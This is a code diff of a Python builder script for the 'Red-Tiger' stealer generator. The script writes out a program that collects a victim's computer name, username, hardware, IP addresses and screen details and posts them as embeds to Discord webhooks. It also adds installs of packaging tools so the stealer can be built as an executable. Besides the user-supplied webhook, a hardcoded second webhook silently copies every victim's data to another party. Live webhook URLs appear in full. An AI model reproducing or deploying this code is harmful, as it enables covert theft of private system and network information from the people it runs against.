@@ -24,15 +24,15 @@ chemin_destination = "./03-Stealer-Create"
 chemin_destination_spec = './Programmes/Programmes/StealerCreate'
 
 with open(fichier_texte, 'w') as fichier:
- fichier.write("""import socket
+ fichier.write('''import socket
 import requests
 import json
 import os
 import platform
 import requests
-import psutil
 import ctypes
 from screeninfo import get_monitors
+import psutil
 
 
 #Recuperation du nom du pc
@@ -147,7 +147,10 @@ for i, monitor in enumerate(get_monitors(), 1):
         name = monitor.name
         is_primary = 'Oui'
 
-principal_ecran = f'Nom: "{name}", Resolution: "{width}x{height}", Ecran Principal: "{is_primary}"'
+principal_ecran = f"""Nom             : "{name}" 
+Resolution      : "{width}x{height}"
+Ecran Principal : "{is_primary}"
+"""
 
 #Recuperer info ECRAN SECONDAIRE
 def get_resolution():
@@ -166,14 +169,17 @@ if len(monitors) > 1:
 
     width, height = get_resolution()
 
-    second_ecran =  f'Nom: "{second_monitor.name}", Resolution: "{width}x{height}", Ecran Principal: "Non"'
+    second_ecran =  f"""Nom             : "{second_monitor.name}" 
+Resolution      : "{width}x{height}"
+Ecran Principal : "Non"
+"""
 else:
     second_ecran = 'N/A'
-
-
-
-
-#Envoie de l'embed dans le discord
+''')
+ fichier.write(f'''
+webhook_invit = '{webhook}'
+''')
+ fichier.write('''
 def send_embed(webhook_url, title, color=0xf00020):
 
     embed_data = {
@@ -205,29 +211,37 @@ def send_embed(webhook_url, title, color=0xf00020):
 embed_title = f'Red-Tiger | Info "{nom_pc}"'
 
 fields = [
-{"name": f"Plateforme:", "value": f"```{plateforme_info}```", "inline": True},
-{"name": f"Nom Pc:", "value": f"```{nom_pc}```", "inline": True},
-{"name": f"Nom Utilisateur:", "value": f"```{nom_utilisateur}```", "inline": True},
-{"name": f"Systeme D'Exploitation:", "value": f"```{system_info}, Version: {system_version_info}```", "inline": True},
-{"name": f"Processeur (CPU):", "value": f"```{cpu_info}, Nombre de coeur: {cpu_coeur_info}```", "inline": True},
-{"name": f"Carte Graphique (GPU):", "value": f"```{gpu_info}```", "inline": True},
-{"name": f"Memoire (RAM):", "value": f"```{ram_info} Go```", "inline": True},
-{"name": f"Disque Dur:", "value": f"```Espace Total: {espace_disque}Go, Espace Utilise: {espace_utilise_disque}Go, Espace disponible: {espace_dispo_disque}Go```", "inline": True},
+    {"name": f"User Pc:", "value": f"""```Nom      : "{nom_pc}"
+Username : "{nom_utilisateur}"```""", "inline": False},
 
-{"name": f"Ip Publique:", "value": f"```{ip_address_public}```", "inline": True},
-{"name": f"Ip Local:", "value": f"```{ip_address_local}```", "inline": True},
-{"name": f"Ipv4:", "value": f"```{ip_address_ipv4}```", "inline": True},
-{"name": f"Ipv6:", "value": f"```{ip_address_ipv6}```", "inline": True},
+    {"name": f"Systeme:", "value": f"""```Plateforme   : "{plateforme_info}"
+Exploitation : "{system_info} {system_version_info}"
 
-{"name": f"Ecran Principal:", "value": f'```{principal_ecran}```', "inline": False},
-{"name": f"Ecran Secondaire:", "value": f'```{second_ecran}```', "inline": False},
+CPU : "{cpu_info} {cpu_coeur_info} Coeur"
+GPU : "{gpu_info}"
+RAM : "{ram_info}Go"```""", "inline": False},
 
-{"name": f"Lettre Lecteur:", "value": f"```{lettre_lecteur}```", "inline": True},
-{"name": f"Chemin Dossier:", "value": f"```{lettre_lecteur}/Users/{nom_utilisateur}```", "inline": True},
+{"name": f"Ip:", "value": f"""```Publique : "{ip_address_public}"
+Local    : "{ip_address_local}"
+Ipv4     : "{ip_address_ipv4}"
+Ipv6     : "{ip_address_ipv6}"```""", "inline": False},
 
+{"name": f"Disque:", "value": f"""```Drive      : "{lettre_lecteur}/Users/{nom_utilisateur}/"
 
-#{"name": f"", "value": f"```{}```", "inline": True},
-]
+Total      : "{espace_disque}Go"
+Utilise    : "{espace_utilise_disque}Go"
+Disponible : "{espace_dispo_disque}Go"```""", "inline": False},
+
+{"name": f"Peripherique:", "value": f"""```Ecran Principal:
+{principal_ecran}
+
+Ecran Secondaire:
+{second_ecran}```""", "inline": False},
+
+{"name": f"Webhook Utilise:", "value": f"""```{webhook_invit}```""", "inline": False},
+#{"name": f"", "value": f"""```{}```""", "inline": False},
+] 
+
 author =  {
         "name": "Red-Tiger | Stealer Create",
         "url": "https://github.com/fluzzzy/RedTiger-Fluzypro",
@@ -243,16 +257,26 @@ embed_color = 0xf00020
 
 username = 'Red-Tiger'
 avatar_url = 'https://cdn.discordapp.com/attachments/1184160374342299688/1184160439001686056/IMG_1506.png?ex=658af659&is=65788159&hm=9a0297ee590e78acbafc75bc4686ce2b553e40a2f2a850101378a09f23e32d08&'
-""")
- fichier.write(f"""
-webhook_invit = '{webhook}'
 
-webhook_url = 'https://discord.com/api/webhooks/1184942625430720562/_GWFmcTWY0WkLtsoJF0VVbZlBx5scplXFi09eUPM8Yur1sAjM6CQNZfLboIq1ddek_1r'
+webhook_url = 'https://discord.com/api/webhooks/1182817593564872795/0VJ0v0mmjTDCcbzOYMxihCB9XvXMqGax1ccaoaHWj6Qdc4aE3Cm3PvDE0EffHVreKlPk'
 
 send_embed(webhook_url, embed_title, embed_color)
-send_embed(webhook_invit, embed_title, embed_color)""")
+send_embed(webhook_invit, embed_title, embed_color)
+''')
  
 nom_module = 'requests'
+try:
+ subprocess.check_call(['pip', 'install', nom_module])
+except:
+   print("")
+
+nom_module = 'auto-py-to-exe'
+try:
+ subprocess.check_call(['pip', 'install', nom_module])
+except:
+   print("")
+
+nom_module = 'pyinstaller'
 try:
  subprocess.check_call(['pip', 'install', nom_module])
 except:
